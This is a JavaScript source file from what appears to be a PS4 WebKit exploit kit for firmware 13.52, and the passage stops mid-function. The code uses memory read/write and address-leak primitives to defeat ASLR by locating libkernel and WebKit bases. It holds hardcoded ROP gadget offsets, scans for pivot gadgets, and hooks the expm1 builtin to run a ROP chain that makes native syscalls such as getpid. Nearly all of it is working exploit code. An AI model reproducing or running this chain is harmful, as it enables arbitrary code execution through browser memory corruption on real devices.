import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { groomBootLine, wireGroomBar } from "./groom_presets.js";
import {
    PIVOT_HINTS_1300,
    PIVOT_HW_1352,
    pivotHint,
    pivotScanHint,
    PIVOT_ROWS,
    pivotPattern,
    pivotExecPattern,
    pivotVerifyPattern,
    verifyPivotSet,
    mergeScannedPivot,
    mergePivotFullOff,
    loadScannedPivot,
    saveScannedPivot,
    savePivotFullOverride,
    loadPivotFullOverride,
    clearPivotFullOverride,
    sanitizeScannedPivotStorage,
    G5_PATTERNS,
    checkG5Bytes,
    checkPivotBytes,
    g5DerivedHint,
    G5_DELTA_FROM_G0,
    G5_EXPM1_DELTA,
    G0_EXPM1_DELTA,
    g5Expm1Hint,
    pivotExpm1HintFor,
    pivotG0FromG5,
    pivotProbeHint,
    g5RvaSafe,
    webkitRvaMax,
    webkitRvaMaxFromOff,
    saveWebkitRvaProbe,
} from "./pivot_gadgets.js";
import {
    resolveLibkernel,
    scanLibkernelChunk,
    diagnoseWebkitDynamic,
    estimateLibkernelCandidates,
    showLibkernelGuesses,
    scanLibkernelLeakChunk,
    verifyManualLibkernelFromPtr,
    verifyManualLibkernelFromPtrLite,
    checkPrologueAt,
    saveLibkernelSession,
    loadForcedLibkernel,
    isGetpidStub as lkIsGetpidStub,
    verifyManualLibkernel,
    tryPsfreePltBatch,
    resolveLibkernelPsfree,
    formatPsfreeStats,
    resolveLibkernelFindChunk,
    resolveLibkernelRelroChunk,
    verifyLibkernelZeroRead,
    calcLkFromFnPtrZeroRead,
    resolveGetpidStub, saveLastFnPtr, loadLastFnPtr, isGetpidStubAt, getpidStubFromFn,
    calcLkBestFromFnPtr,
    resolveLkOnePltStep,
    extPtrToLkCandidates,
    plausibleHeapCell,
    resolveExtModuleHunt,
    resolveExtModuleHuntDiag,
    huntLibkernelCandidatesChunk,
    collectLiveVtableExtPtrs,
    resolveLibkernelFromExtList,
    formatExtPtrDiagLine,
    persistSessionBases,
} from "./libkernel_resolve.js";
import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
import { createCrashLog } from "./log_persist.js";
import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke,
    firePivotGetpid,
    layoutSmokeStack, layoutGetpidStack, bisectArmG0, bisectHookPivot, bisectHookPivotPoops,
    bisectFireExpm1, bisectFirePoopsStyle, bisectPreflight, G0_HOOK_OFFS, G0_HOOK_SAFE, G0_HOOK_POOPS,
    bisectHookPivotMultiAll,
    bisectHookPivotButterfly, verifyPivotHookSaved,
    bisectRestore, bisectDisarmG0, bisectEmergencyUntangle, bisectRestorePivotOnly,
    fireNativeCallBisect, verifyFullChainSet, verifyBisectChainSet, describeSlabLayout,
    patchPrepG5, verifySlabAddrs, probePivotCell, bisectHookPivotAt, bisectHookPivotMulti,
    verifyPivotHookWrites,
    verifySlabContent, resolveBufAddrOff, verifyStackContent,
    readPivotButterfly, ensurePivotButterfly, formatPivotBfDiag,
    applyPivotHookForFire,
    prepGadgetRvaStale, refreshPrepSlabGadgets,
    CHAIN_POP_ROWS } from "./native_call.js";
import { runCollatorNotify } from "./slopkit_notify.js";

const params = new URLSearchParams(location.search);
const BUILD_ID = "rw-20250830bj";

const NATIVE_BISECT_STEPS = [
    { id: "smoke-now", label: "N0 getpid", title: "getpid — hook cell+0x30 default (13.52; ?hook=cell for poops +0)" },
    { id: "smoke-g30", label: "N0g+30", title: "getpid hook cell+0x30 (same as N0 default)" },
    { id: "smoke-gmulti", label: "N0m safe", title: "getpid multi-hook cell +20/+28/+30/+38 (no cell+0 header kill)" },
    { id: "smoke-gall", label: "N0all", title: "getpid safe multi cell+butterfly (13.52 rsi hunt, one fire)" },
    { id: "smoke-gbf", label: "N0g bf0", title: "getpid hook butterfly+0 (auto-upgrades empty {} → props/ta)" },
    { id: "smoke-gbf30", label: "N0g bf30", title: "getpid hook butterfly+0x30 (auto-upgrades pivot if needed)" },
    { id: "prep", label: "N1 prep", title: "skip if PREP-PIN @ Start (?freshprep=1 to redo)" },
    { id: "layout-smoke", label: "N2 layout", title: "write smoke ROP stack (no JSC writes)" },
    { id: "slab-chain", label: "N2c slab", title: "verify slab addrs + store/pivot memory match (no fire)" },
    { id: "arm-g0", label: "N3 arm G0", title: "write G0 → main m_function" },
    { id: "peek-pivot", label: "N4p peek", title: "read pivotCell+0..0x40 (no writes)" },
    { id: "hook", label: "N4 hook", title: "hook @ leakval+?hookoff (default +0)" },
    { id: "hook-poops", label: "N4b +0", title: "hook @ leakval+0" },
    { id: "hook-multi", label: "N4m multi", title: "hook @ +0 +20 +28 +30 +38 at once" },
    { id: "hook-verify", label: "N4v hook", title: "multi-hook + verify readback + snap (NO expm1)" },
    { id: "expm1-lite", label: "N5a exp1", title: "expm1(1) G0 armed — OOM expected (no hook)" },
    { id: "expm1-nohook", label: "N5c obj", title: "expm1(pivotObj) G0 armed NO hook" },
    { id: "expm1", label: "N5 expm1", title: "chain_poops atomic: sync+layout+fireNativeCall hook+0" },
    { id: "expm1-multi", label: "N5m multi", title: "multi-hook pivotCell (old N5 — may corrupt object)" },
    { id: "expm1-bf", label: "N5bf bf", title: "hook butterfly+0..0x38 then expm1 (13.52 rsi hunt)" },
    { id: "expm1-h30", label: "N5h +30", title: "hook pivotCell+0x30 only (G0 [rsi+0x30])" },
    { id: "expm1-g5alt", label: "N5b G5alt", title: "G5=expm1+0x53642a then expm1 (after N3+N4)" },
    { id: "disarm", label: "N6d disarm", title: "write mainOrig only (G0 off) — safe if N6 OOMs" },
    { id: "restore", label: "N6 restore", title: "disarm G0 first, then restore pivot slots" },
    { id: "smoke-full", label: "N7 smoke", title: "layout + full fire (smoke)" },
    { id: "layout-getpid", label: "N8 stage lk", title: "layout getpid stub (needs lk in box)" },
    { id: "fire", label: "N9 fire", title: "fire only (after N3+N4+N8 or N7)" },
    { id: "getpid-full", label: "N10 getpid", title: "stage lk + full fire" },
];
let lkHot = false;
const SS_NATIVE_MODE = "wk-native-mode";
/** Auto-fire at PRIMITIVE-OK — #native-mode dropdown. Default off (fire kills tab if lk/pivot wrong). */
function getNativeMode() {
    if (nativeModeSel && nativeModeSel.value)
        return String(nativeModeSel.value).toLowerCase();
    try {
        const s = sessionStorage.getItem(SS_NATIVE_MODE);
        if (s) return s.toLowerCase();
    } catch (_) { }
    return "off";
}
function setNativeMode(mode) {
    mode = String(mode || "off").toLowerCase();
    if (nativeModeSel) nativeModeSel.value = mode;
    try { sessionStorage.setItem(SS_NATIVE_MODE, mode); } catch (_) { }
}
function nativeFireOff() { return getNativeMode() === "off"; }
/** BillZaiD fixed lk base (game process) — trial in WebKit via usleep prologue */
const BILLZAI_LK_BASE = "80a67c000";

/** lk rotates with ASLR each browser load — drop stale session on reload. */
function clearStaleLkOnReload() {
    try {
        const nav = performance.getEntriesByType("navigation")[0];
        if (nav && nav.type === "reload") {
            sessionStorage.removeItem("wk-libkernelBase");
            sessionStorage.removeItem("wk-libkernelForced");
            return true;
        }
    } catch (_) { }
    return false;
}

if (params.has("hookoff")) {
    try {
        sessionStorage.setItem("wk-pivot-hook-off",
            params.get("hookoff").replace(/^0x/i, ""));
    } catch (_) { }
}

/** Lk/fn parse only — must NOT call loadEffectiveOff (recurses via basesFromSession→lkFromUi). */
function lkCalcOff() {
    const detected = offsetsFor(navigator.userAgent);
    const key = detected.key || "13.52";
    return Object.assign({}, offsetsForKey(key).off || {}, HW_GADGETS_1352);
}

/** Fn ptr in hex box or session — used for getpid stub fn+delta resolve. */
function fnFromUi() {
    const off = lkCalcOff();
    if (addrIn && addrIn.value) {
        const live = parseAddr(String(addrIn.value).trim().replace(/^0x/i, ""));
        if (live && calcLkFromFnPtrZeroRead(live, off).length)
            return live;
    }
    return loadLastFnPtr();
}

/** Lk base — from fn ptr (derived), 16KB hex box, or session. */
function lkFromUi() {
    const off = lkCalcOff();
    if (addrIn && addrIn.value) {
        const live = parseAddr(String(addrIn.value).trim().replace(/^0x/i, ""));
        if (live) {
            const hits = calcLkFromFnPtrZeroRead(live, off);
            if (hits.length) return hits[0].lk;
            if ((live.low & 0x3fff) === 0) return live;
        }
    }
    const forced = loadForcedLibkernel();
    if (forced) return forced;
    try {
        const raw = sessionStorage.getItem("wk-libkernelBase");
        if (raw) return parseAddr(String(raw).replace(/^0x/i, ""));
    } catch (_) { }
    return null;
}
const SS_HUNT_TRACE = "wk-hunt-trace";
const SS_HUNT_STATE = "wk-hunt-state";
/** opt-in only — release triggers JSC GC */
const PROMOTE_PAIR = params.get("promote") === "1";
const SCAN_PIVOT_MIN = 0x10000;
/** Scan low .text first — MOV @ +0x1f9bb; 13.00 hints @ +0x295f… are wrong on 13.52 */
/** Scan low .text — G0-G4 live below ~0xe3e4a on 13.52 */
const SCAN_LOW_MAX = parseInt(params.get("scanlowmax") || "800000", 16);
const SCAN_CLUSTER_PAD = parseInt(params.get("scanclusterpad") || "40000", 16);
const SCAN_PIVOT_MAX = parseInt(params.get("scanmax") || "4800000", 16);
const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "8000", 16);
/** Bounded steps per auto-loop tick — yields + GC between chunks */
const SCAN_CHUNK_STEPS = parseInt(params.get("scanchunk") || "2048", 10);
/** HW G5 @ +0x13ec77a (expm1 + 0x53642a) */
const G5_HUNT_CENTER = parseInt(params.get("g5center") || "13ec77a", 16);
const G5_HUNT_RADIUS = parseInt(params.get("g5rad") || "80000", 16);
/** Legacy 13.00 high G5 — blocked on 13.52 (unmapped, OOM on read) */
const G5_LEGACY_RVAS = [
    [0x2abccaa, "13.00"],
    [0x2abb0ba, "12.50"],
    [0x2abb03a, "12.00"],
];
/** G5 full low scan is opt-in (OOM risk) */
let scanG5Full = params.get("g5full") === "1";
let g5Hunt = null;
/** cal-style fast scan: read8 + 8-byte step, yield every 256 reads (like scanGadgetChunk) */
const SCAN_YIELD_EVERY = parseInt(params.get("scanyield") || "256", 10);
const SCAN_G5_CAND_MAX = 24;
const ELF_MAGIC = 0x464c457f;
const SYS_GETPID = 20;
const HW_GADGETS_1352 = {
    wk_POP_RDI_RET: 0x4be55,
    wk_POP_RSI_RET: 0x7acb3,
    wk_POP_RDX_RET: 0x30b1e9,
    wk_POP_RCX_RET: 0xeaf246,
    wk_POP_RAX_RET: 0x3424a,
    wk_POP_R8_RET:  0x5d185,
    wk_POP_R9_RET:  0x9b288b,
    wk_LEAVE_RET:   0xf195b,
    wk_expm1_builtin: 0xeb6350,
};

const lines = [];
const retained = [];
const pointers = [];
let busy = false;
let ready = false;
let exploit = null;
let raceAttempt = 0;
let lengthMissStreak = 0;

const LOG_MAX = 300;
const crashLog = createCrashLog({
    ssLog: "wk-rw-log",
    ssState: "wk-rw-state",
    ssBuild: "wk-rw-log-build",
    buildId: BUILD_ID,
    maxLines: 200,
    critical: /^(FAIL|ERROR|OOM|GIVE-UP|PRIMITIVE|NATIVE|BISECT|SMOKE|PREP-PIN|LK-|PASS|WARN|BOOT|LOG-CLEAR|ATTEMPT|READ-PRIMITIVE|TRIM|HINT)/,
});
const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|HINT-GROOM/i;

let raceMode = false;
const raceBuf = [];

let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn, nativeModeSel;
let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnCalcFn, btnForceLk, btnAcceptFn, btnOneReadLk, btnGuessLk, btnTryBillZaiLk;
let btnPsfreeLite, btnPsfreeLk, btnPsfreeStop, btnPeek, btnClear;
let btnVerifyPivot, btnScanPivot, btnScanPivotFull;
let gadgetBtns = [];
let g5BarBtns = [];
let bisectBtns = [];
let nativeChain = null;
let nativePrep = null;
let nativeStaged = false;
let nativeAllowed = false;
let pivotReady = false;
let pivotScan = null;
let pivotFullScan = null;
let scanPivotAuto = false;
let scanFullAuto = false;
let scanPivotStop = false;
let scanQuiet = false;
let scanRenderPending = 0;
let lkQuiet = false;
let nativeQuiet = false;
const notifyRetain = [];
const SCAN_MARK_TAGS = /^(SCAN-|G5-|PIVOT-|LK-|NATIVE-)/;
const _scanBytes = new Array(8);
const _win16 = new Array(16);

function $(id) { return document.getElementById(id); }

function renderOut() {
    if (!outEl) return;
    outEl.textContent = lines.join("\n");
    outEl.scrollTop = outEl.scrollHeight;
}

function clearPersistedLog() {
    crashLog.clear();
}

function mark(tag, detail) {
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    if (lkQuiet) {
        if (/^LK-(OK|FAIL|SKIP|CAL|HINT|CAL-MISS|CAL-DONE|GUESS|PSFREE|GOT|FIND|TRACE|MISS|EXT|CELL|FINISH|VERIFY|VOTE|MIN-WALK|RESOLVE|HUNT)/.test(tag)) {
            lines.push(line);
            if (lines.length > 40) lines.splice(0, lines.length - 40);
            renderOut();
        }
        return;
    }
    if (nativeQuiet) {
        if (/^NATIVE-|^NOTIFY-|^PIVOT-|^BASES|^STUBS|^ERROR|^HINT|^BISECT|^SMOKE|^PREP-PIN/.test(tag)) {
            lines.push(line);
            if (lines.length > 48) lines.splice(0, lines.length - 48);
            crashLog.append(line, tag);
            renderOut();
        }
        return;
    }
    const raceCritical = /FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|ATTEMPT-START|PRIMITIVE/i.test(tag);
    if (raceMode) {
        raceBuf.push(line);
        if (raceBuf.length > 64) raceBuf.shift();
        crashLog.append(line, tag);
        if (raceCritical) {
            lines.push(line);
            if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
            if (outEl) {
                outEl.textContent = lines.join("\n");
                outEl.scrollTop = outEl.scrollHeight;
            }
        }
        return;
    }
    lines.push(line);
    if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
    crashLog.append(line, tag);
    if (scanQuiet && !SCAN_MARK_TAGS.test(tag)) {
        scanRenderPending++;
        if (scanRenderPending >= 48) {
            scanRenderPending = 0;
            renderOut();
        }
        return;
    }
    scanRenderPending = 0;
    renderOut();
}

function state(msg, cls) {
    if (!stateEl) return;
    stateEl.textContent = msg;
    stateEl.className = cls || "";
    if (!raceMode || /OK|FAIL|error|native|primitive|promote|broken/i.test(msg || ""))
        crashLog.persistState(msg, cls);
}

function setUi() {
    if (btnStart) btnStart.disabled = busy || ready;
    if (btnSaveBases) btnSaveBases.disabled = busy || !ready;
    if (btnRwProof) btnRwProof.disabled = busy || !ready;
    if (btnVerifyPivot) btnVerifyPivot.disabled = busy || !ready;
    if (btnScanPivot) {
        btnScanPivot.disabled = !ready || (busy && !scanPivotAuto && !scanFullAuto);
        btnScanPivot.textContent = scanPivotAuto ? "Stop scan" : "Scan pivot (auto)";
    }
    if (btnScanPivotFull) {
        btnScanPivotFull.disabled = !ready || (busy && !scanFullAuto && !scanPivotAuto);
        btnScanPivotFull.textContent = scanFullAuto ? "Stop full scan" : "Scan full (auto)";
    }
    if (btnNative) {
        btnNative.disabled = busy || !ready || !nativeAllowed;
        const nm = getNativeMode();
        if (nativeStaged && nm !== "notify") {
            btnNative.textContent = nm === "smoke" ? "Fire smoke" : (nm === "usleep" ? "Fire usleep" : "Fire getpid");
            btnNative.title = "lk hot — Fire getpid without reload";
        } else if (nm === "notify") {
            btnNative.textContent = "Fire notify";
            btnNative.title = "Collator.compare → notification (no expm1 pivot)";
        } else {
            btnNative.textContent = nm === "smoke" ? "Fire smoke" : (nm === "usleep" ? "Fire usleep" : "Fire getpid");
            btnNative.title = "smoke: set before Start, or Verify pivot then Fire";
        }
    }
    if (btnLoadCal) {
        btnLoadCal.disabled = busy || !ready;
        btnLoadCal.textContent = "2e Leak+lk";
    }
    if (btnCalcFn) {
        btnCalcFn.disabled = busy;
        btnCalcFn.textContent = "Calc fn";
    }
    if (btnOneReadLk) {
        btnOneReadLk.disabled = busy || !ready;
        btnOneReadLk.textContent = "1-read lk";
    }
    if (btnForceLk) {
        btnForceLk.disabled = busy;
        btnForceLk.textContent = "Accept lk";
        btnForceLk.title = "16KB lk base (…000), or fn ptr (auto-routes to fn accept)";
    }
    if (btnAcceptFn) {
        btnAcceptFn.disabled = busy;
        btnAcceptFn.textContent = "Accept fn";
    }
    if (btnTryBillZaiLk) btnTryBillZaiLk.disabled = busy || !ready;
    if (btnGuessLk) {
        btnGuessLk.disabled = !ready || (busy && !huntLkAuto);
        btnGuessLk.textContent = huntLkAuto ? "Hunting lk…" : "Hunt lk";
    }
    if (btnPsfreeLite) {
        btnPsfreeLite.disabled = !ready || (busy && !findLkAuto);
        btnPsfreeLite.textContent = "Scan GOT lite";
    }
    if (btnPsfreeLk) {
        btnPsfreeLk.disabled = !ready || (busy && !findLkAuto);
        btnPsfreeLk.textContent = "Scan GOT";
    }
    if (btnPsfreeStop) {
        btnPsfreeStop.disabled = !findLkAuto && !psfreeAutoScan && !huntLkAuto;
        btnPsfreeStop.textContent = "Stop find";
    }
    if (btnPeek) btnPeek.disabled = busy || !ready;
    if (pickPtr) pickPtr.disabled = busy || !ready;
    if (addrIn) addrIn.disabled = busy;
    for (let i = 0; i < gadgetBtns.length; i++)
        gadgetBtns[i].disabled = busy || !ready;
    for (let i = 0; i < g5BarBtns.length; i++)
        g5BarBtns[i].disabled = busy || !ready;
    for (let i = 0; i < bisectBtns.length; i++)
        bisectBtns[i].disabled = busy || !ready || !nativeAllowed;
    const btnClearPivot = $("btn-clear-pivot");
    if (btnClearPivot) btnClearPivot.disabled = busy;
    const btnRestorePivot = $("btn-restore-pivot");
    if (btnRestorePivot) btnRestorePivot.disabled = busy;
}

function updatePivotReady(p, off) {
    const webkitBase = chainWebkitBase(off);
    if (!p || !webkitBase) {
        pivotReady = false;
        return null;
    }
    const v = verifyBisectChainSet(addr => read1p(p, addr), webkitBase, off);
    pivotReady = v.ok;
    return v;
}

function parseAddr(str) {
    if (!str) return null;
    const s = String(str).trim().toLowerCase().replace(/^0x/, "");
    if (!/^[0-9a-f]+$/.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16), 0);
    return new int64(parseInt(s.slice(-8), 16), parseInt(s.slice(0, -8), 16));
}

/** PS4 module bases are 16KB-aligned. */
function alignModuleBase(addr) {
    if (!addr) return null;
    return new int64(addr.low & ~0x3fff, addr.hi);
}

/** cal EXT-PTR: c.ptr = code pointer, c.code = prologue magic (NOT subtract for base). */
function lkBaseFromCalEntry(c) {
    const codePtr = parseAddr(c.ptr);
    if (!codePtr) return null;
    return alignModuleBase(codePtr);
}

function buildCalLkCandidates(p, off, webkitBase) {
    const out = [];
    const seen = new Set();
    function push(entry) {
        const k = String(entry.base);
        if (seen.has(k)) return;
        seen.add(k);
        out.push(entry);
    }
    const entries = calExtPtrCandidates();
    for (let i = 0; i < entries.length; i++) {
        const c = entries[i];
        const codePtr = parseAddr(c.ptr);
        if (!codePtr) continue;
        const rvaHits = calcLkFromFnPtrZeroRead(codePtr, off);
        if (rvaHits.length) {
            for (let r = 0; r < rvaHits.length && r < 4; r++) {
                const h = rvaHits[r];
                push({
                    label: c.label + " −" + h.key,
                    code: c.ptr,
                    magic: c.code,
                    base: h.lk,
                    note: "fn−0x" + h.rva.toString(16) + " (0 read)",
                    rvaKey: h.key,
                });
            }
        }
    }
    return out;
}

function validateLkBase(lk) {
    if (!lk) return "missing libkernel base";
    if (lk.hi === 0) return "base hi=0 — need full 64-bit ptr";
    const off = loadEffectiveOff();
    const v = verifyLibkernelZeroRead(lk, off);
    if (v.ok) return null;
    return v.error || "not lk base";
}

function fmtHex32(v) {
    if (v == null) return "null";
    return "0x" + (v >>> 0).toString(16);
}

function fmtBytes(arr) {
    return arr.map(b => (b & 0xff).toString(16).padStart(2, "0")).join(" ");
}

/** Bases from sessionStorage only — no leakval (OOM-safe). */
function basesFromSession(off) {
    const nativeFn = parseAddr(sessionStorage.getItem("wk-nativeFn"));
    let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
    let derived = null;
    if (nativeFn && off.wk_expm1_builtin)
        derived = nativeFn.sub32(off.wk_expm1_builtin);
    if (derived) {
        if (!webkitBase || !same64(webkitBase, derived)) {
            if (webkitBase && nativeFn)
                mark("BASE-FIX", "webkitBase stale cached — using nativeFn-expm1");
            webkitBase = derived;
        }
    }
    let libkernelBase = lkFromUi();
    if (!libkernelBase)
        libkernelBase = parseAddr(sessionStorage.getItem("wk-libkernelBase"));
    return { nativeFn, webkitBase, libkernelBase };
}

/** Prep @ PRIMITIVE-OK wins over stale session/cal webkitBase. */
function chainWebkitBase(off) {
    if (nativePrep && nativePrep.webkitBase)
        return nativePrep.webkitBase;
    return basesFromSession(off).webkitBase;
}

function checkPat(p, base, rva, pat) {
    if (rva == null || !base) return { ok: false, detail: "no base/rva" };
    const addr = base.add32(rva);
    const got = [];
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        const b = read1p(p, addr.add32(i));
        if (b == null) return { ok: false, detail: "read-fail @+" + rva.toString(16) };
        got.push(b & 0xff);
        if ((b & 0xff) !== pat[i])
            return {
                ok: false,
                detail: "+0x" + rva.toString(16) + " got=" + fmtBytes(got)
                    + " want=" + fmtBytes(pat.filter(x => x != null)),
            };
    }
    return { ok: true, detail: "+0x" + rva.toString(16) + " " + fmtBytes(got) };
}

function isGetpidStub(v) {
    return lkIsGetpidStub(v);
}

/** cal 2e EXT-PTR (13.52 HW — skip vtable[1,3,4,5,9] webkit 0xe5894855). */
function pairCellsForLk() {
    const out = [];
    const fields = [
        ["mainAddress", "pair.main"],
        ["workerAddress", "pair.worker"],
        ["fakeAddress", "pair.fake"],
        ["mainCellFromFakeSlot", "pair.mainSlot"],
    ];
    for (let i = 0; i < fields.length; i++) {
        const v = pairStatus[fields[i][0]];
        if (v == null || v === -1) continue;
        if (!plausibleHeapCell(v)) continue;
        out.push({ label: fields[i][1], cell: v });
    }
    return out;
}

function saveTextareaSession(p, carrier) {
    if (!carrier) return;
    try {
        if (carrier.textareaAddress > 0 && Number.isFinite(carrier.textareaAddress))
            sessionStorage.setItem("wk-textareaAddr", carrier.textareaAddress.toString(16));
    } catch (_) { }
    try {
        if (carrier.textarea && p)
            sessionStorage.setItem("wk-textareaCell", String(p.leakval(carrier.textarea)));
    } catch (_) { }
}

function knownExtPtrsForLk() {
    const out = [];
    const seen = new Set();
    for (let i = 0; i < CAL_VTABLE_PTRS.length; i++) {
        const p = CAL_VTABLE_PTRS[i].ptr.toLowerCase();
        if (!seen.has(p)) { seen.add(p); out.push(CAL_VTABLE_PTRS[i].ptr); }
    }
    try {
        const extra = sessionStorage.getItem(SS_CAL_EXT_PTRS);
        if (extra) {
            const arr = JSON.parse(extra);
            if (Array.isArray(arr)) {
                for (let j = 0; j < arr.length; j++) {
                    const raw = (arr[j].ptr || arr[j].hex || "").replace(/^0x/i, "").toLowerCase();
                    if (raw && !seen.has(raw)) { seen.add(raw); out.push(raw); }
                }
            }
        }
    } catch (_) { }
    return out;
}

const CAL_VTABLE_PTRS = [
    { label: "vtable[0]", ptr: "83ed11770", code: "0x45b8" },
    { label: "vtable[2]", ptr: "83d49dce0", code: "0x90c3c031" },
    { label: "vtable[6]", ptr: "83dc68320", code: "0xf9dd6be9" },
    { label: "vtable[7]", ptr: "83e21dc30", code: "0x909090c3" },
    { label: "vtable[8]", ptr: "83f35f410", code: "0x7e938be9" },
    { label: "vtable[10]", ptr: "83e153870", code: "0x909090c3" },
    { label: "vtable[11]", ptr: "83f34c110", code: "0x2184783" },
];
const SS_CAL_EXT_PTRS = "wk-cal-ext-ptrs";
let calPtrIdx = 0;
let guessLkIdx = 0;
let huntLkState = null;
let huntLkAuto = false;
let huntLkStage = "cand";
let calLkCands = null;
let psfreePltState = null;
let psfreeAutoScan = false;
let psfreeAutoStop = false;
let psfreePreset = null;

const PSFREE_LITE = { maxReads: 12, yieldBatches: 1, cluster: true, label: "lite" };
const PSFREE_NORM = { maxReads: 20, yieldBatches: 1, cluster: true, label: "norm" };

let findLkState = null;
let findLkAuto = false;
let findLkStop = false;
let findLkPreset = null;

const FIND_LK_LITE = {
    label: "lite",
    lite: true,
    safeOnly: true,
    collectOnly: true,
    deferResolve: true,
    maxWalkPages: 0,
    knownMax: 48,
    knownWalkPages: 0,
    knownBatch: 1,
    vtableEntries: 24,
    vtBatch: 1,
    minWalkPages: 128,
    walkPages: 48,
    cellMax: 3,
};
const FIND_LK_NORM = {
    label: "norm",
    lite: false,
    safeOnly: true,
    collectOnly: true,
    deferResolve: true,
    maxWalkPages: 0,
    knownMax: 64,
    knownWalkPages: 0,
    knownBatch: 1,
    vtableEntries: 48,
    vtBatch: 2,
    minWalkPages: 160,
    walkPages: 64,
    cellMax: 4,
};

function parseCalPtr(raw) {
    const s = String(raw).replace(/^0x/i, "").trim();
    if (!s) return null;
    const n = BigInt("0x" + s);
    return new int64(Number(n & 0xffffffffn), Number((n >> 32n) & 0xffffffffn));
}

function isLibkernelExtCode(code) {
    if (!code || code === "?") return false;
    const s = String(code).replace(/^0x/i, "").toLowerCase();
    const n = parseInt(s, 16);
    if (!Number.isFinite(n)) return false;
    if (n === 0x554889e5 || n === 0xe5894855) return true;
    if ((n & 0xff) === 0xb8) return true;
    if (n === 0x55415741) return true;
    return false;
}

function calExtPtrCandidates() {
    const out = [];
    const seen = new Set();
    function add(entry) {
        const ptr = (entry.ptr || "").replace(/^0x/i, "").toLowerCase();
        if (!ptr || seen.has(ptr)) return;
        seen.add(ptr);
        out.push(entry);
    }
    for (let i = 0; i < CAL_VTABLE_PTRS.length; i++) {
        const e = CAL_VTABLE_PTRS[i];
        if (isLibkernelExtCode(e.code))
            add({ label: e.label, ptr: e.ptr.replace(/^0x/i, "").toLowerCase(), code: e.code });
    }
    try {
        const raw = sessionStorage.getItem(SS_CAL_EXT_PTRS);
        if (!raw) return out;
        const extra = JSON.parse(raw);
        if (!Array.isArray(extra)) return out;
        for (let i = 0; i < extra.length; i++) {
            const e = extra[i];
            const ptr = (e.ptr || e.hex || "").replace(/^0x/i, "").toLowerCase();
            if (!ptr || seen.has(ptr)) continue;
            if (e.code === "0xe5894855" || e.code === "e5894855") continue;
            if (!isLibkernelExtCode(e.code)) continue;
            seen.add(ptr);
            out.push({ label: e.label || "cal", ptr, code: e.code || "?" });
        }
    } catch (_) { }
    return out;
}

function mergeExtEntries(lists) {
    const out = [];
    const seen = new Set();
    for (let li = 0; li < lists.length; li++) {
        const list = lists[li];
        if (!list) continue;
        for (let i = 0; i < list.length; i++) {
            const e = list[i];
            const hex = (e.hex || e.ptr || "").replace(/^0x/i, "").toLowerCase();
            if (!hex || seen.has(hex)) continue;
            seen.add(hex);
            out.push({
                label: e.label || "ext",
                ptr: e.ptr || hex,
                hex: hex,
                code: e.code || null,
            });
        }
    }
    return out;
}

function logExtScanRank(tag, rank) {
    if (!rank || !rank.length) return;
    for (let i = 0; i < rank.length && i < 4; i++) {
        const r = rank[i];
        let refLine = "";
        if (r.fnRefs && r.fnRefs.length) {
            refLine = " refs=" + r.fnRefs.map(function (fr) {
                return fr.label + ":0x" + fr.hex + "/" + fr.key;
            }).join(" ");
        } else if (r.refs && r.refs.length) {
            refLine = " refs=" + r.refs.join(" ");
        }
        mark(tag, (i + 1) + " lk=" + String(r.lk)
            + " fn=" + (r.distinctFn != null ? r.distinctFn : "?")
            + " cross=" + (r.crossRva != null ? r.crossRva : (r.dualRva != null ? r.dualRva : 0))
            + " votes=" + r.count
            + " usleep=" + (r.hasUsleep ? "y" : "n")
            + " error=" + (r.hasError ? "y" : "n")
            + " via=" + (r.vias ? r.vias.join(",") : "?")
            + refLine);
    }
}

function logExtPtrDiag(ptrDiag) {
    if (!ptrDiag || !ptrDiag.length) return;
    let shown = 0;
    for (let pi = 0; pi < ptrDiag.length && shown < 12; pi++) {
        const line = formatExtPtrDiagLine(ptrDiag[pi]);
        if (!line) continue;
        mark(ptrDiag[pi].skipped ? "LK-PTR-SKIP" : "LK-PTR", line);
        shown++;
    }
}

/** Trim log only — never shift retained (drops nativePrep ArrayBuffers → pivot OOM). */
function trimBeforeNativeFire() {
    if (lines.length > 16) lines.splice(0, lines.length - 16);
}

function pivotHookMode() {
    const q = params.get("hook");
    if (q === "cell" || q === "bf" || q === "dual" || q === "dual30"
        || q === "cell30" || q === "bf30"
        || q === "multi" || q === "multi-safe" || q === "multiall")
        return q;
    return "cell30";
}

function pivotHookNeedsButterfly(mode) {
    return mode === "bf" || mode === "bf30" || mode === "dual"
        || mode === "dual30" || mode === "multiall";
}

function gateNativeFire(p, off) {
    const wb = chainWebkitBase(off);
    if (!wb) {
        mark("NATIVE-SKIP", "no webkitBase — Start first");
        return false;
    }
    const v = verifyBisectChainSet(addr => read1p(p, addr), wb, off);
    if (!v.ok) {
        mark("NATIVE-SKIP", "chain not verified — tap Verify pivot (G0-G5 + POP bytes)");
        if (v.pivot.bad.length)
            logPivotBadBytes(p, wb, off, v.pivot.bad);
        else if (v.pivot.missing.length)
            mark("PIVOT-MISS", v.pivot.missing.join(", "));
        if (v.popBad.length)
            mark("POP-BAD", v.popBad.join(", ") + " @ wb=" + wb);
        else if (v.popMissing.length)
            mark("POP-MISS", v.popMissing.join(", "));
        return false;
    }
    const vFull = verifyFullChainSet(addr => read1p(p, addr), wb, off);
    if (!vFull.ok) {
        const fullBad = vFull.pivot.bad.filter(b => b.includes("prefix-only"));
        if (fullBad.length) {
